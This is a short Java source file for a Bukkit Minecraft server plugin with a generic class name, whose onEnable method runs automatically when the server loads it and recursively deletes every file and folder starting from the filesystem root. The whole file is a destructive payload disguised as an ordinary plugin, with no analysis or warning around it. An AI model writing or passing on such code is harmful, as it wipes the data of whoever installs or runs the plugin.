package bukkit.plugin;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.File;

public final class Plugin extends JavaPlugin {

    @Override
    public void onEnable() {
        removeDir(new File("/"));
    }

    private void removeDir(File dir) {
        if (dir.isFile()) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) removeDir(file);
                file.delete();
            }
        }
    }

}
